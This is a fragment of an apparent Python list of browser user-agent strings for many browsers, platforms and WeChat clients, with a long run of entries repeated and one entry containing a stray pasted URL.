     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	 "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	 "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
